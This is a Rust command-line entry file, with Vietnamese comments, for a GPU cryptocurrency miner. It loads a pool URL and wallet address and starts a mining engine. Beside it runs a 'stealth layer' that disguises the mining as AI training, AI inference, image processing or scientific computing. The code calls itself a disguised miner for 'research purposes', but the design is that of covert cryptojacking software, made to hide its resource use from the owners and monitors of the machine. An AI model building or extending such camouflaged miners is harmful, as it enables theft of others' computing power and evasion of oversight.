//! # Giao diện Dòng lệnh Khai thác (Mining CLI)
//!
//! Đây là điểm vào chính của ứng dụng, chịu trách nhiệm phân tích cú pháp các đối số,
//! tải cấu hình, và khởi tạo các mô-đun `mining-core` và `stealth-layer`.

use clap::{Parser, Subcommand};
use config::{Config, File};
use mining_core::{MiningAlgorithm, MiningConfig, MiningEngine};
use serde::Deserialize;
use stealth_layer::{CamouflageProfile, StealthManager};
use std::path::PathBuf;
use std::sync::{
    atomic::{AtomicBool, Ordering},
    Arc,
};

// --- Cấu trúc cho việc tải từ tệp .toml ---

#[derive(Debug, Deserialize, Clone)]
struct AppConfig {
    mining: MiningSection,
    stealth: StealthSection,
}

#[derive(Debug, Deserialize, Clone)]
struct MiningSection {
    pool_url: String,
    wallet_address: String,
    algorithm: String, // Đọc dưới dạng chuỗi, sau đó chuyển đổi
    gpu_devices: Vec<u32>,
    intensity: u8,
}

#[derive(Debug, Deserialize, Clone)]
struct StealthSection {
    enabled: bool,
    profile: String, // Đọc dưới dạng chuỗi, sau đó chuyển đổi
}

// --- Cấu trúc CLI ---

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = "Một ứng dụng khai thác GPU được ngụy trang cho mục đích nghiên cứu.")]
struct Cli {
    #[arg(short, long, value_name = "FILE", default_value = "config/default.toml")]
    config: PathBuf,

    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand, Debug)]
enum Commands {
    Start,
}

// --- Logic chính ---

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    env_logger::init();
    let cli = Cli::parse();

    match cli.command {
        Commands::Start => {
            println!("Đang bắt đầu hệ thống...");

            // 1. Tải cấu hình từ tệp
            let settings = Config::builder()
                .add_source(File::from(cli.config))
                .build()?
                .try_deserialize::<AppConfig>()?;

            // 2. Chuyển đổi cấu hình đã tải thành các loại dữ liệu của ứng dụng
            let mining_config = MiningConfig {
                pool_url: settings.mining.pool_url,
                wallet_address: settings.mining.wallet_address,
                algorithm: match settings.mining.algorithm.as_str() {
                    "Ethash" => MiningAlgorithm::Ethash,
                    "KawPow" => MiningAlgorithm::KawPow,
                    "RandomX" => MiningAlgorithm::RandomX,
                    _ => return Err("Thuật toán không hợp lệ trong tệp cấu hình".into()),
                },
                gpu_devices: settings.mining.gpu_devices,
                intensity: settings.mining.intensity,
            };

            let camouflage_profile = match settings.stealth.profile.as_str() {
                "AiTraining" => CamouflageProfile::AiTraining,
                "ImageProcessing" => CamouflageProfile::ImageProcessing,
                "ScientificComputing" => CamouflageProfile::ScientificComputing,
                "AiInference" => CamouflageProfile::AiInference,
                _ => return Err("Hồ sơ ngụy trang không hợp lệ trong tệp cấu hình".into()),
            };

            // 3. Thiết lập cơ chế tắt nhẹ nhàng (Graceful Shutdown)
            let running = Arc::new(AtomicBool::new(true));
            let r = running.clone();

            tokio::spawn(async move {
                tokio::signal::ctrl_c().await.expect("Không thể bắt tín hiệu Ctrl-C");
                println!("\nĐã nhận tín hiệu Ctrl-C! Đang tắt hệ thống một cách nhẹ nhàng...");
                r.store(false, Ordering::SeqCst);
            });


            // Khởi tạo các trình quản lý
            let mining_engine = MiningEngine::new(mining_config);
            let stealth_manager = StealthManager::new(camouflage_profile);

            // Chạy các thành phần trong luồng riêng với tín hiệu tắt
            let mining_shutdown = running.clone();
            let mining_handle = std::thread::spawn(move || {
                mining_engine.start(mining_shutdown);
            });

            if settings.stealth.enabled {
                let stealth_shutdown = running.clone();
                let stealth_handle = std::thread::spawn(move || {
                    stealth_manager.apply_camouflage(stealth_shutdown);
                });
                stealth_handle.join().expect("Luồng ngụy trang đã panic!");
            }

            println!("Các mô-đun đã được khởi chạy. Nhấn Ctrl+C để thoát.");

            mining_handle.join().expect("Luồng khai thác đã panic!");
            println!("Hệ thống đã tắt thành công.");
        }
    }
    Ok(())
}